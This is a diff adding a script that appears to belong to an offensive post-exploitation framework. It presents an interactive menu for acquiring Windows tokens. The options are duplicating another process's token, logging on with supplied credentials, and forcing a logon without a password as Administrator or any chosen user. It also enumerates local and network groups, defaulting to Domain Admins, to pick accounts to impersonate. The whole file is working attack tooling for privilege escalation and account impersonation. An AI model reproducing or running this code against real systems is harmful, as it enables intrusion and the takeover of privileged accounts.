@@ -1,0 +1,365 @@
+@echo off;
+#--------------------------------------------------------
+# Acquires a token
+#--------------------------------------------------------
+@include "_Arrays.dsi";
+@include "_Menu.dsi";
+@include "_ZippyBangShared.dsi";
+@include "_VersionChecks.dsi";
+
+string %menu, %params, $temp;
+bool $logon = IsCommandAvailable( "logonasuser" ), $dup = IsCommandAvailable( "duplicatetoken" ), $auth = IsCommandAvailable( "authentication" ); 
+if( !(  $logon || $dup || ( $auth && $logon ) ) ) {
+	echo( "*** This platform does not support _AcquireToken.dss", ERROR );
+	return false;
+}
+
+# check to see if we have the required privilege on windows
+if( _IsWindowsNt() ) {
+	int $UNKNOWN		= 0;
+	int $NOT_FOUND		= 1;
+	int $NOT_ENABLED	= 2;
+	int $FOUND			= 3;
+	int $status = $UNKNOWN;
+	@record on;
+	bool $ret = `processinfo`;
+	@record off;
+	string $SUGGESTED;
+	_AppendString( $SUGGESTED, "SeTcbPrivilege" );
+	
+	if( $ret ) {
+		object $property;
+		if( GetCmdData("processinfo::privileges::privilege", $property) &&
+			defined( $property ) ) {
+			
+			for( int $i = 0; $i < sizeof( $property ) && $status != $NOT_ENABLED; $i++ ) {
+				string $name;
+				bool $enabled;
+				
+				if( GetObjectData($property[$i], "name", $name) &&
+					GetObjectData($property[$i], "attributes::priv_enabled", $enabled ) &&
+					defined( $name ) &&
+					defined( $enabled ) 
+					) {
+					
+					for( int $j = 0; $j < sizeof( $SUGGESTED ) && $status != $NOT_ENABLED; $j++ ) {
+						if( $name == $SUGGESTED ) {
+							$status = $FOUND;
+							if( !$enabled ) {
+								$status = $NOT_ENABLED;
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	if( $status != $FOUND ) {
+		if( $status == $UNKNOWN ) {	
+			echo( "*** Unable to determine available privileges", WARNING );
+		} else if( $status == $NOT_FOUND ) {
+			echo( "*** It appears that suggested privileges are not available", WARNING );
+		} else if( $status == $NOT_ENABLED ) {
+			echo( "*** It appears that suggested privileges are not enabled", WARNING );
+		}
+		echo( "*** This may cause complications with acquired Tokens", WARNING );
+		echo( "***    SUGGESTED PRIVILEGES", WARNING );
+		for( int $i = 0; $i < sizeof( $SUGGESTED ); $i++ ) {
+			echo( "***      $SUGGESTED[$i]", WARNING );
+		}
+	}
+}
+
+if( !(
+		_CreateMenu( %menu, "Acquire Token", %params{'main'} ) && defined( %params{'main'} ) &&
+		(
+			_AddSection( %menu, %params{'main'}, "", %params{'mainSection'} ) && defined( %params{'mainSection'} ) &&
+			(
+				!$logon ||
+				_AddOption ( %menu, %params{'mainSection'}, "Log On With Username and Password", 	"DomainAuthentication" 	)
+			) &&
+			(
+				!$dup ||
+				_AddOption ( %menu, %params{'mainSection'}, "Duplicate Process Token", 	"DuplicateToken" 		)
+			) &&
+			(
+				#should prevent ForceLogon from showing
+				!($auth && $logon) ||
+				_AddOption ( %menu, %params{'mainSection'}, "Log On Without Password", 	"ForceLogon" 			)
+			)
+		) &&
+		_CreateMenu( %menu, "Duplicate Token", %params{'duplicate'} ) && defined( %params{'duplicate'} ) &&
+		(
+			_AddSection( %menu, %params{'duplicate'}, "", %params{'duplicateProcesses'} ) && defined( %params{'duplicateProcesses'} )
+		) &&
+		_CreateMenu( %menu, "Log On (Without Password) As...", %params{'forceLogon'} ) && defined( %params{'forceLogon'} ) &&
+		(
+			_SetHeader ( %menu, %params{'forceLogon'}, "ForceLogonHeader" ) &&
+			_AddSection( %menu, %params{'forceLogon'}, "", %params{'ForceLogonSection'} ) && defined( %params{'ForceLogonSection'} ) &&
+			_AddOption ( %menu, %params{'ForceLogonSection'}, "Default (\"Administrator\")", "ForceLogonAs", true, "Administrator", $temp ) &&
+			_AddOption ( %menu, %params{'ForceLogonSection'}, "Enter a name", "ForceLogonEnter" ) &&
+			_AddSection( %menu, %params{'forceLogon'}, "Current Group", %params{'ForceLogonCurrentGroup'} )  && defined( %params{'ForceLogonCurrentGroup'} ) &&
+			_AddSection( %menu, %params{'forceLogon'}, "Change User List to Local Group:",  %params{'ForceLogonLocalGroups'} )   && defined( %params{'ForceLogonLocalGroups'} ) &&
+			_AddSection( %menu, %params{'forceLogon'}, "Change User List to Network Group:",  %params{'ForceLogonNetworkGroups'} ) && defined( %params{'ForceLogonNetworkGroups'} ) &&
+			_HideSection( %menu, %params{'ForceLogonLocalGroups'} ) &&
+			_HideSection( %menu, %params{'ForceLogonNetworkGroups'} ) &&
+			_AddOption  ( %menu, %params{'ForceLogonSection'}, "Retrieve Local Groups",   "RetrieveLocalGroups",   true, "", %params{'RetrieveLocalGroups'} ) &&
+			_AddOption  ( %menu, %params{'ForceLogonSection'}, "Retrieve Network Groups", "RetrieveNetworkGroups", true, "", %params{'RetrieveNetworkGroups'} )
+		)
+) ) {
+	echo( "*** Unable to create Acquire Token menu", ERROR );
+	return false;
+}
+
+%params{'groupLocal'} = "false";
+%params{'groupName'}  = "Domain Admins";
+
+
+if( !_ExecuteMenu( %menu, %params{'main'}, %params ) ) {
+	return false;
+}
+
+if( defined( %params{'token_handle'} ) ) {
+	StartCmdData( "Logon" );
+	AddCmdData( "task", 	<int>%params{'task'} );
+	AddCmdData( "handle", 	<int>%params{'token_handle'} );
+	AddCmdData( "alias",  	%params{'token_alias'}  );
+	StoreCmdData();
+}
+
+return true;
+
+#-------------------------------------------------------------------------------#
+sub DomainAuthentication( REF string %menu, REF string %params, IN string $key, REF bool $cont ) {
+	if( !EnterUserInformation( %params ) ) {
+		return false;
+	}
+
+	echo "Logging on as '%params{'fullname'}'";
+	@record on;
+	if( !PrintStatus( `logonasuser -user "%params{'username'}" -domain "%params{'domain'}" -password "%params{'password'}"` ) ) {
+		return true;
+	}
+	@record off;
+	
+	echo "Getting Command Data";
+	int $id, $temp;
+	if( PrintStatus( (
+			GetCmdData( "logon::handle", $temp					) && defined( $temp					  ) &&
+			GetCmdData( "logon::alias",  %params{'token_alias'}	) && defined( %params{'token_alias'}  ) &&
+			GetCmdData( "commandmetadata::id", $id				) && defined( $id )
+	) ) ) {
+		AddCommandToStopList( %params, $id );
+		%params{'token_handle'} = "$temp";
+		%params{'task'} = "$id";
+		$cont = false;
+	}
+
+	return true;	
+}
+
+#-------------------------------------------------------------------------------#
+sub DuplicateToken( REF string %menu, REF string %params, IN string $key, REF bool $cont ) {
+	# remove any from the last time this was run
+	echo "Getting process list";
+	@record on;
+	if( !PrintStatus( `duplicatetoken -list` ) ) {
+		return true;
+	}
+	@record off;
+
+	echo "Getting Command Data";
+	object $processes;
+	if( !PrintStatus( (
+			GetCmdData( "process", $processes ) && defined( $processes )
+	) ) ) {
+		return true;
+	}
+	
+	string 	$text;
+	int $ids;
+	for( int $i = 0; $i < sizeof( $processes ); $i++ ) {
+		int $id;
+		string $name, $user;
+		$text[$i] = "";
+		if( GetObjectData( $processes[$i], "id", $id ) && defined( $id ) ) {
+			$text[$i] = "$text[$i]($id) ";
+			$ids[$i] = $id;
+		} else {
+			$ids[$i] = -1;
+		}
+		if( GetObjectData( $processes[$i], "name", $name ) && defined( $name ) ) {
+			$text[$i] = "$text[$i]$name ";
+		}
+		if( GetObjectData( $processes[$i], "user", $user ) && defined( $user ) ) {
+			$text[$i] = "$text[$i][$user] ";
+		}
+	}
+	
+	string $temp;
+	int $index;
+	if( !_ExecuteSimpleMenu( "Choose a process", $text, $temp, $index ) || !defined( $index ) ) {
+		return true;
+	}
+	
+	echo "Duplicate token";
+	@record on;
+	if( !PrintStatus( `duplicatetoken -duplicate $ids[$index]` ) ) {
+		return true;
+	}
+	@record off;
+	
+	echo "Getting Command Data";
+	int $id;
+	if( PrintStatus( (
+			GetCmdData( "token::value",  %params{'token_handle'} ) && defined( %params{'token_handle'} ) &&
+			GetCmdData( "token::alias",  %params{'token_alias'} )  && defined( %params{'token_alias'} ) &&
+			GetCmdData( "commandmetadata::id", $id ) && defined( $id )
+	) ) ) {
+		%params{'task'} = "$id";
+		$cont = false;
+	}
+	return true;	
+}
+
+#-------------------------------------------------------------------------------#
+sub ForceLogon( REF string %menu, REF string %params, IN string $key, REF bool $cont ) {
+	string $match;
+	if( RegexMatch( "([^|]+)\\|(.+)", $key, $match ) && defined( $match ) && sizeof( $match ) == 2 ) {
+		%params{'groupLocal'} = $match[0];
+		%params{'groupName'}  = $match[1];
+		$cont = false;
+	}
+
+	if( !_ExecuteMenu( %menu, %params{'forceLogon'}, %params ) ) {
+		return false;
+	}
+	
+	if( defined( %params{'token_alias'} ) ) {
+		$cont = false;
+	}
+	
+	return true;
+}
+
+#-------------------------------------------------------------------------------#
+sub ForceLogonHeader( REF string %menu, REF string %params, IN string $key, REF bool $cont ) {
+	_HideAll( %menu, %params{'ForceLogonCurrentGroupList'} );
+	_HideSection( %menu, %params{'ForceLogonCurrentGroup'} );
+	
+	# Find all members of the current group	
+	string $title = "%params{'groupName'}";
+	if( <bool>%params{'groupLocal'} ) {
+		$title = "$title (Local)";
+	} else {
+		$title = "$title (Network)";
+	}
+	_RenameSection( %menu, %params{'ForceLogonCurrentGroup'}, "Users in $title" );
+	echo "Getting Users in current group";
+	string $network = "";
+	if( !<bool>%params{'groupLocal'} ) {
+		$network = "-network";
+	}
+	@record on;
+	if( PrintStatus( `users -group "%params{'groupName'}" $network`) ) {
+		echo "Getting Command Data";
+		string $username, $fullname;
+		if( PrintStatus( (
+				GetCmdData( "user::name",		$username ) && defined( $username ) &&
+				GetCmdData( "user::fullname",	$fullname ) && defined( $fullname )
+		) ) ) {
+			for( int $i = 0; $i < sizeof( $fullname ); $i++ ) {
+				string $display = $username[$i];
+				if( strlen( $fullname[$i] ) > 0 ) {
+					$display = "$display ($fullname[$i])";
+				}
+				_AddToSection( %menu, %params{'ForceLogonCurrentGroup'}, %params{'ForceLogonCurrentGroupList'}, $i, $display, $username[$i], "ForceLogonAs" );
+				_ShowSection( %menu, %params{'ForceLogonCurrentGroup'} );
+			}
+		}
+	}
+	@record off;
+	return true;
+}
+
+#-------------------------------------------------------------------------------#
+sub ForceLogonEnter( REF string %menu, REF string %params, IN string $key, REF bool $cont ) {
+	if( GetInput( "Enter the username", $key ) ) {
+		return ForceLogonAs( %menu, %params, $key, $cont );
+	}
+	return true;
+}
+
+#-------------------------------------------------------------------------------#
+sub ForceLogonAs( REF string %menu, REF string %params, IN string $key, REF bool $cont ) {
+	@record on;
+	if( `ForceLogon -user $key` ) {
+		int $id, $handle;
+		echo "Getting Command Data";
+		if( PrintStatus( (
+			GetCmdData( "logon::handle", $handle 				) && defined( $handle 				) &&
+			GetCmdData( "logon::task",   $id     				) && defined( $id     				) &&
+			GetCmdData( "logon::alias",  %params{'token_alias'} ) && defined ( %params{'token_alias'} )
+		) ) ) {
+			%params{'task'} = "$id";
+			%params{'token_handle'} = "$handle";
+			$cont = false;
+		}
+	} else {
+		echo("Unable to foce a logon as $key", ERROR);
+	}
+	@record off;
+	return true;
+}
+
+#-------------------------------------------------------------------------------#
+sub RetrieveLocalGroups( REF string %menu, REF string %params, IN string $key, REF bool $cont ) {
+	# Find all groups in the local computer
+	echo "Getting local Groups";
+	@record on;
+	if( PrintStatus( `groups`) ) {
+		echo "Getting Command Data";
+		string $group;
+		if( PrintStatus( (
+				GetCmdData( "group::group", $group ) && defined( $group )
+		) ) ) {
+			for( int $i = 0; $i < sizeof( $group ); $i++ ) {
+				_AddToSection( %menu, %params{'ForceLogonLocalGroups'}, %params{'ForceLogonLocalGroupsList'}, $i, $group[$i], "true|$group[$i]", "ForceLogon" );
+				
+			}
+		}
+	}
+	@record off;
+
+	_ShowSection( %menu, %params{'ForceLogonLocalGroups'} );
+	_HideOption( %menu, %params{'RetrieveLocalGroups'} );
+	$cont = true;
+	return true;
+}
+
+#-------------------------------------------------------------------------------#
+sub RetrieveNetworkGroups( REF string %menu, REF string %params, IN string $key, REF bool $cont ) {
+	# find all groups in the network
+	echo "Getting network Groups";
+	@record on;
+	if( PrintStatus( `groups -network`) ) {
+		echo "Getting Command Data";
+		string $group;
+		if( PrintStatus( (
+				GetCmdData( "group::group", $group ) && defined( $group )
+		) ) ) {
+			for( int $i = 0; $i < sizeof( $group ); $i++ ) {
+				_AddToSection( %menu, %params{'ForceLogonNetworkGroups'}, %params{'ForceLogonNetworkGroupsList'}, $i, $group[$i], "false|$group[$i]", "ForceLogon" );
+			}
+		}
+	
+	}
+	@record off;
+	
+	_ShowSection( %menu, %params{'ForceLogonNetworkGroups'} );
+	_HideOption( %menu, %params{'RetrieveNetworkGroups'} );
+	$cont = true;
+	return true;
+}
+
+
